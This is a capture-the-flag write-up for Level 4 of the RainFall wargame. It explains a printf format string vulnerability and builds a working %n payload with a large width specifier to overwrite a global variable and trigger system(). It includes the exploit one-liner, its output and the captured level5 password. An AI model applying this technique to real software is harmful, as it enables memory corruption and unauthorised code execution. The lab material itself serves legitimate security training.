## Level 4

### Vulnerability Analysis
The target is `level4`. Running the `main` function simply calls `n()`.

Examining `n()` and `p()` reveals a similar pattern to Level 3, but with the format string vulnerability located inside a helper function:
1. `n()` allocates a 520 byte buffer and safely reads user input using `fgets(buffer, 512, stdin)`.
2. It passes this buffer to a helper function `p()`.
3. `p(char *buffer)` prints the passed buffer using `printf(buffer)` (Format String Vulnerability).
4. `n()` then checks the global variable at address `0x8049810`. 
5. If the global variable is equal to `0x1025544` (`16930116` in decimal), it executes `system()` to give us a shell (or simply run `/bin/cat /home/user/level5/.pass`).

### The Exploit
Just like Level 3, we must use `%n` to overwrite the address `0x8049810`. However, the required value is extremely large: `16,930,116`. Printing 16 million spaces to standard output is not feasible; it would crash the system or take forever. 

Thankfully, the `printf` family supports width specifiers. Using `%[amount]c` or `%[amount]x`, we can trick `printf` into outputting a massive number without practically sending that many raw string characters through the pipe.

First, we find the format string offset of our buffer parameter.
```bash
level4@RainFall:~$ ./level4 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 ...
```
We see `41414141` appears at the 12th position. This means our format string offset is `12`.

We construct a payload consisting of the target address `0x8049810`, followed by a massive width specifier to force the output counter to exactly `16,930,116`.
The target address takes up 4 bytes. We write:
`16,930,116` - `4` (bytes for the address) = `16,930,112` bytes to pad.

We use `%16930112d` or `%16930112x` to generate that massive padding easily. Then we use `%12$n` to write the total output character count into the address provided as the 12th parameter.

Payload: `[Target Address] + [%16930112x] + [%12$n]`

```bash
level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"'; cat) | ./level4
... (Lots of spaces) ...
-1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

*(Note: In this level, `system()` directly executed `cat /home/user/level5/.pass` rather than dropping us into a shell, which is why the password was printed automatically!)*
